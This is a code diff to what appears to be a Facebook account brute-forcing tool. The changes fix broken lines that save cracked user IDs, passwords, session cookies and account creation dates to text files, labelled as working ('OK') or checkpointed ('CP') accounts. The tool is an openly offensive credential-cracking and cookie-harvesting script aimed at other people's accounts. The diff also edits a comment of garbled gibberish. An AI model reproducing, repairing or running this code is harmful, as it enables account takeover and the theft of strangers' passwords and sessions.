@@ -2024,13 +2024,13 @@ def checker(idf, pwv, index):
 				cp+=1
 				print(f'\r\033[1;91m└──[✵>𝚁𝚎𝚊𝚕𝚒𝚝𝚢 𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜-𝐂𝐏] {idf} | {ps}	  \n♻️تاريخ إنشاء الحساب -└──>  :{tahun(idf)}\n')
 				os.system('espeak -a 300 "  Cp,  Id  "')
-				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'|'+{tahun(idf)}'\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-CP.txt','a').write(idf+'|'+ps+'|'+tahun(idf)+'\n')
 			elif 'c_user' in r.cookies.get_dict():
 				ok+=1
 				coki=r.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
 				print(f'\r\033[1;92m└──[✵>𝚁𝚎𝚊𝚕𝚒𝚝𝚢 𝚟𝚒𝚕𝚕𝚊𝚒𝚗𝚜-𝐎𝐊]  🆔 :|	 {idf}	   🔑 :|	 {ps} \n \n\033[0;96m[🌐]= 𝙲𝙾𝙾𝙺𝙸𝙴𝚂└──> \033[38;5;48m{kuki} \n♻️تاريخ إنشاء الحساب -└──>  :{tahun(idf)}\n')
-				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'|'+{tahun(idf)}+'\n\n')
+				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-OK.txt','a').write(idf+'|'+ps+'|'+kuki+'|'+tahun(idf)+'\n\n')
 				open('/storage/emulated/0/𝐇𝐚𝐜𝐤-𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤/فيسبوك-حسابات Ok-CP/حسابات-rOK.txt','a').write(idf+'|'+ps+'\n')
 			else:
 				continue
@@ -2688,4 +2688,4 @@ if __name__ == "__main__":
     brute = Brute()  # كائن من الفئة Brute
     Menu()           # عرض القاjئnnمjjة أو nتنفيذ الخياراتgh
     
-    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙ت𝚑𝚑😋gbتتتااhj𝐡𝐡
+    #bhgوتyyyتتتتناتتjjhmnhhhyاتتاااbنh,😙=\|ت𝚑𝚑😋gbتتتااhj𝐡𝐡
